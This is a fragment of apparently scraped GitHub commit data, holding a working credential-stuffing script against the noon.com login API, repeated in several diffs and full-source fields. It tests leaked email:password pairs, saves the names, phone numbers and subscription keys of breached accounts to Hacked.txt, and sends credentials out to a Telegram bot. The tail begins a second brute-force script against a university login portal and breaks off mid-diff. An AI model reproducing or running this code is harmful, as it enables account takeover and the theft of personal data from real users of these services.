Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'\n            x.write(acc)\n    except Exception as i:\n        with open('Hacked.txt', 'a') as x:\n            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\ndef Brute_Force_Noon(user,pess):\n    try:\n        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})\n        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)\n        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")\n    except KeyboardInterrupt:exit()\ndef O_File():\n    FL=input('[+] Combo File Name : ')\n    count=0\n    try:\n        for x in open(FL,'r').read().splitlines():\n            count+=1\n            user=x.split(\":\")[0]\n            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n    except IndexError:exit()\n    except FileNotFoundError:print('[!] The File Not Found !');return O_File()\nos.system('cls' if os.name == 'nt' else 'clear');header();O_File()\n"}},"msg":"Update Brute-Force-Noon.py"},"9661075343928f1a4307bef70cdb3f57a61fb9f5":{"url":"https:\/\/api.github.com\/repos\/Filza2\/Brute-Force-Noon\/commits\/9661075343928f1a4307bef70cdb3f57a61fb9f5","html_url":"https:\/\/github.com\/Filza2\/Brute-Force-Noon\/commit\/9661075343928f1a4307bef70cdb3f57a61fb9f5","sha":"9661075343928f1a4307bef70cdb3f57a61fb9f5","keyword":"brute force update","diff":"diff --git a\/Brute-Force-Noon.py b\/Brute-Force-Noon.py\nindex 6292007..47849f1 100644\n--- a\/Brute-Force-Noon.py\n+++ b\/Brute-Force-Noon.py\n@@ -20,7 +20,7 @@ def saver(user,pess,rq):\n     try:\n         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n         with open('Hacked.txt', 'a') as x:\n-            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n     except Exception as i:\n         with open('Hacked.txt', 'a') as x:\n             x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n","message":"","files":{"\/Brute-Force-Noon.py":{"changes":[{"diff":"\n     try:\n         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n         with open('Hacked.txt', 'a') as x:\n-            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n     except Exception as i:\n         with open('Hacked.txt', 'a') as x:\n             x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n","add":1,"remove":1,"filename":"\/Brute-Force-Noon.py","badparts":["            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')"],"goodparts":["            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')"]}],"source":"\ntry:import os;from requests import post;from time import sleep;from colorama import Fore except ModuleNotFoundError:exit('[!] Download The Missing Module !') def header(): print(\"\"\" \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d By @TweakPY -@vv1ck \"\"\") def saver(user,pess,rq): ID='' token='' try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked{user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck') except:pass try: r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode'] with open('Hacked.txt', 'a') as x: x.write(f'USR[]\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm}{lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n') except Exception as i: with open('Hacked.txt', 'a') as x: x.write(f'USR[]\\nEmail:[{user}]\\nPassword:[{pess}]\\n') def Brute_Force_Noon(user,pess): try: rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0(X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess}) if rq.status_code==200:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.GREEN}Hacked{Fore.RESET} >>{user}:{pess}\");saver(user,pess,rq) else:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >>{user}:{pess}\") except KeyboardInterrupt:exit() def O_File(): FL=input('[+] Combo File Name: ') try: for x in open(FL,'r').read().splitlines(): user=x.split(\":\")[0] pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess) except IndexError:exit() except FileNotFoundError:print('[!] The File Not Found !');return O_File() os.system('cls' if os.name=='nt' else 'clear');header();O_File() ","sourceWithComments":"try:import os;from requests import post;from time import sleep;from colorama import Fore\nexcept ModuleNotFoundError:exit('[!] Download The Missing Module !')\ndef header():\n    print(\"\"\"\n    \n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n\n                By @TweakPY - @vv1ck                                         \n\"\"\")\ndef saver(user,pess,rq):\n    ID=''#Telegram id\n    token=''#Telegram bot token\n    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n    except:pass\n    try:\n        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n        with open('Hacked.txt', 'a') as x:\n            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n    except Exception as i:\n        with open('Hacked.txt', 'a') as x:\n            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\ndef Brute_Force_Noon(user,pess):\n    try:\n        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})\n        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)\n        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")\n    except KeyboardInterrupt:exit()\ndef O_File():\n    FL=input('[+] Combo File Name : ')\n    try:\n        for x in open(FL,'r').read().splitlines():\n            user=x.split(\":\")[0]\n            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n    except IndexError:exit()\n    except FileNotFoundError:print('[!] The File Not Found !');return O_File()\nos.system('cls' if os.name == 'nt' else 'clear');header();O_File()\n"}},"msg":"Update Brute-Force-Noon.py"},"987baaa92cde7a6c67e11d82d0b009142f8fab8e":{"url":"https:\/\/api.github.com\/repos\/Filza2\/Brute-Force-Noon\/commits\/987baaa92cde7a6c67e11d82d0b009142f8fab8e","html_url":"https:\/\/github.com\/Filza2\/Brute-Force-Noon\/commit\/987baaa92cde7a6c67e11d82d0b009142f8fab8e","message":"Update Brute-Force-Noon.py","sha":"987baaa92cde7a6c67e11d82d0b009142f8fab8e","keyword":"brute force update","diff":"diff --git a\/Brute-Force-Noon.py b\/Brute-Force-Noon.py\nindex 47849f1..9e6d13f 100644\n--- a\/Brute-Force-Noon.py\n+++ b\/Brute-Force-Noon.py\n@@ -1,5 +1,5 @@\n try:import os;from requests import post;from time import sleep;from colorama import Fore\n-except ModuleNotFoundError:exit('[!] Download The Missing Module !')\n+except Exception as e:print(f'[!] Download The Missing Module ! , {e}');exit()\n def header():\n     print(\"\"\"\n     \n","files":{"\/Brute-Force-Noon.py":{"changes":[{"diff":"\n try:import os;from requests import post;from time import sleep;from colorama import Fore\n-except ModuleNotFoundError:exit('[!] Download The Missing Module !')\n+except Exception as e:print(f'[!] Download The Missing Module ! , {e}');exit()\n def header():\n     print(\"\"\"\n     \n","add":1,"remove":1,"filename":"\/Brute-Force-Noon.py","badparts":["except ModuleNotFoundError:exit('[!] Download The Missing Module !')"],"goodparts":["except Exception as e:print(f'[!] Download The Missing Module ! , {e}');exit()"]}],"source":"\ntry:import os;from requests import post;from time import sleep;from colorama import Fore except ModuleNotFoundError:exit('[!] Download The Missing Module !') def header(): print(\"\"\" \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d By @TweakPY -@vv1ck \"\"\") def saver(user,pess,rq): ID='' token='' try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked{user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck') except:pass try: r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode'] with open('Hacked.txt', 'a') as x: x.write(f'USR[]\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm}{lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n') except Exception as i: with open('Hacked.txt', 'a') as x: x.write(f'USR[]\\nEmail:[{user}]\\nPassword:[{pess}]\\n') def Brute_Force_Noon(user,pess): try: rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0(X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess}) if rq.status_code==200:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.GREEN}Hacked{Fore.RESET} >>{user}:{pess}\");saver(user,pess,rq) else:os.system('cls' if os.name=='nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500${Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >>{user}:{pess}\") except KeyboardInterrupt:exit() def O_File(): FL=input('[+] Combo File Name: ') try: for x in open(FL,'r').read().splitlines(): user=x.split(\":\")[0] pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess) except IndexError:exit() except FileNotFoundError:print('[!] The File Not Found !');return O_File() os.system('cls' if os.name=='nt' else 'clear');header();O_File() ","sourceWithComments":"try:import os;from requests import post;from time import sleep;from colorama import Fore\nexcept ModuleNotFoundError:exit('[!] Download The Missing Module !')\ndef header():\n    print(\"\"\"\n    \n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n\n                By @TweakPY - @vv1ck                                         \n\"\"\")\ndef saver(user,pess,rq):\n    ID=''#Telegram id\n    token=''#Telegram bot token\n    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n    except:pass\n    try:\n        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n        with open('Hacked.txt', 'a') as x:\n            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\nName:[{fnm} {lN}]\\nPhone Number:[{phone}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nLanguage:[{lc}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n')\n    except Exception as i:\n        with open('Hacked.txt', 'a') as x:\n            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\ndef Brute_Force_Noon(user,pess):\n    try:\n        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})\n        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)\n        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")\n    except KeyboardInterrupt:exit()\ndef O_File():\n    FL=input('[+] Combo File Name : ')\n    try:\n        for x in open(FL,'r').read().splitlines():\n            user=x.split(\":\")[0]\n            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n    except IndexError:exit()\n    except FileNotFoundError:print('[!] The File Not Found !');return O_File()\nos.system('cls' if os.name == 'nt' else 'clear');header();O_File()\n"}},"msg":"Update Brute-Force-Noon.py"}},"https:\/\/github.com\/yusufaktan\/bf":{"84deb623200c20e37b4a63dcbab35550817be0fa":{"url":"https:\/\/api.github.com\/repos\/yusufaktan\/bf\/commits\/84deb623200c20e37b4a63dcbab35550817be0fa","html_url":"https:\/\/github.com\/yusufaktan\/bf\/commit\/84deb623200c20e37b4a63dcbab35550817be0fa","message":"Update brute-force.py","sha":"84deb623200c20e37b4a63dcbab35550817be0fa","keyword":"brute force update","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex 60cb9fe..385c1ed 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -18,7 +18,6 @@\n # Dosya i\u015flemleri i\u00e7in kulland\u0131\u011f\u0131m\u0131z k\u00fct\u00fcphane\n \n print(\"\\n \uff09\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\uff08\")\n-print(f\" \uff09          {Back.RED}ISTINYE UNIVERSITESI{Back.RESET}          \uff08\")\n print(\" \uff09----------------------------------------\uff08\")\n print(\" \uff09           Brute-Force Attack           \uff08\")\n print(\" \uff09           ------------------           \uff08\")\n@@ -43,7 +42,7 @@\n                  )]\n # Browser kimli\u011fini tan\u0131ml\u0131yoruz -> useragentstring.com\n \n-print(\"[A] myISU\")\n+print(\"[A] LINK\")\n print(\"[B] ECZANE DB\")\n secim = input(\"SECIM    = \")\n print(\"-------------------------------------------------\\n\")\n@@ -69,7 +68,7 @@ def proxy():\n         return proxy()\n \n \n-def bruteforceMyISU():\n+def bruteforce1():\n     sifre = open(sifreDosyasi).read().splitlines()\n     try_login = 0\n     print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\")\n@@ -79,7 +78,7 @@ def bruteforceMyISU():\n             try_login = 0\n         sys.stdout.write('\\r[-] {} [-] '.format(sifre))\n         sys.stdout.flush()\n-        adres = \"https:\/\/myisu.istinye.edu.tr\/tr\/user\/login?destination=\"\n+        adres = \"link\"\n         